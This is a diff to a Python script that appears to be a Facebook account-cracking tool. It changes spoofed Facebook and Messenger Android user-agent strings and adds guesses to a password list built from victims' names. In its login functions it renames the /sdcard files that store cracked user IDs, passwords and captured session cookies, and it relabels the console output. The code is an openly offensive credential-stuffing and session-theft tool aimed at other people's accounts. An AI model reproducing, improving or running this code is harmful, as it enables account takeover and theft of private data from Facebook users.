@@ -531,10 +531,10 @@ else:
 #------------[ THIS IS FOR METHOD 1 ]--------------#  
 #------------[ THIS IS FOR RANDOM 1 ]--------------#  	     	     
 def ONE():
-    END = 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G950F Build/RKQ1.200123.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36 [FBAN/FB4A;FBAV/312.0.0.22.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/211864857;FBOP/5;FBCA/armeabi-v7a:armeabi;FB_FW/1;]'
-    ua = 'Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:C1896Q AppleWebKit/537.36 (KHTML, like Gecko)86 0 6047 67 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:V5092V AppleWebKit/537.36 (KHTML, like Gecko)90 0 6606 60 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:T9105U AppleWebKit/537.36 (KHTML, like Gecko)80 0 6232 87 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
+    END = 'Android;FBAV/299.0.0.12.112;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/199281912;FBCR/Maxcom;FBMF/samsung;FBBD/samsung;;FBDV/SM-G3518;FBDM/{density=1.0,width=720,=height=1200};FBSV/13.0.1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build/M1AJB) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-J410G;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1384};FB_FW/1;] FBBK/1'
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/Orca Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/344064014;FBCR/Movistar;FBMF/m otorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi v7a:armeabi;FBDM/{density=2.0,width=720,height=1344);FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 11; ASUS_I005DC Build/RKQ1.210303.002) [FBAN/FB4A;FBAV/336.0.0.20.117;FBPN/com.facebook.katana;FBLC/zh_TW_#Hant;FBBV/317766059;FBCR/&amp;#21488-&amp;#28771-&amp;#22823-&amp;#21733-&amp;#22823-;FBMF/asus;FBBD/asus;FBDV/ASUS_I005DC;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2322};FB_FW/1;FBRV/0;]","Dalvik/2.1.0 (Linux; U; Android 10; SM-T290 Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/364.0.0.10.112;FBPN/com.facebook.orca;FBLC/en_US;FBBV/374667243;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-T290;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.3312501,width=1280,height=736};FB_FW/1;] '+END
     return ua   
-    ua1 = 'Mozilla/5.0 (Linux; Android 9: 8; Linux; Android 9:A7154Z AppleWebKit/537.36 (KHTML, like Gecko)84 0 5890 41 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 6; Linux; Android 9:E9181K AppleWebKit/537.36 (KHTML, like Gecko)84 0 6363 76 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:R136U AppleWebKit/537.36 (KHTML, like Gecko)100 0 6429 84 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
+    ua1 = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;] FBBK/1","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;] FBBK/1","Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;] '+END
     return ua     
 #------------[ THIS IS FOR METHOD 2 ]--------------#    
 #------------[ THIS IS FOR RANDOM 2 ]--------------#  	        
@@ -1172,6 +1172,8 @@ def menu():
                                         plist.append('firstlast123')
                                         plist.append('firstlast12345')
                                         plist.append('firstlast@12345')
+                                        plist.append('firstlast123@')
+                                        plist.append('@firstlast')
                                         plist.append('kathmandu')
                                         plist.append('last@123')
                                         plist.append('maya123')      
@@ -1189,7 +1191,7 @@ def menu():
                                         plist.append('@first') 
                                         plist.append('first123@@$')
                                         plist.append('first@@') 
-                                        plist.append('first00')      
+                                        plist.append('firstlast12345')      
                                 else:
                                         try:
                                                 clear()
@@ -1486,8 +1488,8 @@ def api1(ids,names,passlist):
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("Cookie: "+coki)
                                        #print("\033[1;32mChecking active and expired apps...\033[0m
-                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/NOT-ANKIT->OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/NOYT-ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/NOT-ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
@@ -1517,7 +1519,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M1] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M2] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -1561,23 +1563,23 @@ def api2(ids,names,passlist):
                                         print('\r\r\033[1;32m [NOT-ANKIT->OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/NOT-ANKIT->OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/NOT-ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/NOT-ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[ANKIT-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[NOT-ANKIT-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
                                                 print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/NOT-ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/NOT-ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -1682,23 +1684,23 @@ def api3(ids,names,passlist):
                                         print('\r\r\033[1;32m [NOT-ANKIT->OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BRAND-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/NOT-ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/NOT-ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[ANKIT-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[NOT-ANKIT-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [NOT-ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/NOT-ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/NOT-ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -1806,13 +1808,13 @@ def ffb(ids,names,passlist):
                                         print('\r\r\033[1;32m [NOT-ANKIT->OK] '+ids+' | '+pas+' | ' + joined(coki) + '\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/NOT-ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                         open('/sdcard/NOT-ANKIT->OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break                     
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[38;5;205m [NOT-ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
